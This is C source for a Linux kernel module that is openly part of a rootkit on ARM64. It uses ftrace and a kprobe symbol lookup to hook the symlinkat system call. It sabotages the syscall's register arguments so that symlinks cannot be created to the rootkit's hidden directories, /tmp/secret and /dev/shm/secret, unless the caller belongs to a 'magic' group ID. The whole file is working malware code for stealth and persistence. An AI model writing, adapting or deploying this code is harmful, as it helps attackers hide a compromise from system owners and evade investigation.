/* ftrace fires on __arm64_sys_symlinkat to block any creation of symlinks on hidden directories */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/cred.h>

#include "rootkit.h"

/* symlink blocking */

static unsigned long target_func_addr;
bool slink_block_active;

static char *normalize_path(const char *src, char *dst, size_t dlen)      //since symlinkat just stores a pointer to strings with no resolution
{
  const char *p = src;
  char *out = dst;
  char *end = dst + dlen - 1;
  char *slash_stack[64];
  int sp = 0;

  if (!src || !dst || dlen < 2)
    return NULL;

  if (*p != '/') {
    strncpy(dst, src, dlen - 1);
    dst[dlen - 1] = '\0';
    return dst;
  }

  *out++ = '/';
  slash_stack[sp++] = dst;
  p++;

  while (*p && out < end) {
    if (*p == '/') { p++; continue; }

    if (p[0] == '.' && (p[1] == '/' || p[1] == '\0')) {
      p += 1 + (p[1] == '/');
      continue;
    }

    if (p[0] == '.' && p[1] == '.' && (p[2] == '/' || p[2] == '\0')) {
      p += 2 + (p[2] == '/');
      if (sp > 1) {
        sp--;
        out = slash_stack[sp] + 1;
      } else {
        out = dst + 1;
      }
      continue;
    }

    if (sp < 64)
      slash_stack[sp++] = out - 1;

    while (*p && *p != '/' && out < end)
      *out++ = *p++;
    if (*p == '/') {
      if (out < end) *out++ = '/';
      p++;
    }
  }

  if (out > dst + 1 && *(out - 1) == '/')
    out--;

  *out = '\0';
  return dst;
}


static void notrace slink_block_callback(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct ftrace_regs *fregs)
{
  int ret;
  char raw_buf[MAX_PATH_LEN];
  char resolved_buf[MAX_PATH_LEN];
  char *resolved;
  size_t hd1_len = sizeof(HIDDEN_DIR_1) - 1;
  size_t hd2_len = sizeof(HIDDEN_DIR_2) - 1;

  if (!slink_block_active) //switch not state
    return;

  // Syscall wrappers on ARM64 receive a pt_regs pointer as their only argument (x0)
  struct pt_regs *inner_regs = (struct pt_regs *)fregs->regs[0];

  // The actual 1st argument (oldname) is in inner_regs->regs[0]
  const char __user *filename = (const char __user *)inner_regs->regs[0];

  ret = strncpy_from_user(raw_buf, filename, sizeof(raw_buf));
  if (ret < 0)
    return;

  resolved = normalize_path(raw_buf, resolved_buf, sizeof(resolved_buf));
  if(!resolved)
    resolved = raw_buf;

  // check against /tmp/secret
  if (strncmp(resolved, HIDDEN_DIR_1, hd1_len) == 0){
    if (resolved[hd1_len] == '\0' || resolved[hd1_len] == '/') {
      if (caller_has_magic_gid() == false) {
        inner_regs->regs[0] = 0;                     // Sabotage the inner registers
        pr_info("[rootkit][symlink-block] blocked symlink creation to %s\n", HIDDEN_DIR_1);
      }
    }
  }

  //check against /dev/shm/secret
  if (strncmp(resolved, HIDDEN_DIR_2, hd2_len) == 0){
    if (resolved[hd2_len] == '\0' || resolved[hd2_len] == '/') {
      if (caller_has_magic_gid() == false) {
        inner_regs->regs[0] = 0;                     // Sabotage the inner registers
        pr_info("[rootkit][symlink-block] blocked symlink creation to %s\n", HIDDEN_DIR_2);
      }
    }
  }
}


static struct ftrace_ops slink_block_ops = {
	.func  = slink_block_callback,
	.flags = FTRACE_OPS_FL_IPMODIFY | FTRACE_OPS_FL_RECURSION,
};

int slink_block_init(void)
{
  int ret;

  target_func_addr = kprobe_lookup("__arm64_sys_symlinkat");
  if (target_func_addr == 0) return -ENOENT;

  ret = ftrace_set_filter_ip(&slink_block_ops, target_func_addr, 0, 0);
  if (ret < 0) return ret;

  ret = register_ftrace_function(&slink_block_ops);
  if (ret < 0) {
    ftrace_set_filter_ip(&slink_block_ops, target_func_addr, 1, 0);
    return ret;
  }

  slink_block_active = true;
  pr_info("[symlink-block] ftrace registered\n");
  return 0;
}

void slink_block_exit(void)
{
  unregister_ftrace_function(&slink_block_ops);
  ftrace_set_filter_ip(&slink_block_ops, target_func_addr, 1, 0);

  slink_block_active = false;

  pr_info("[symlink-block] ftrace unregistered\n");
}
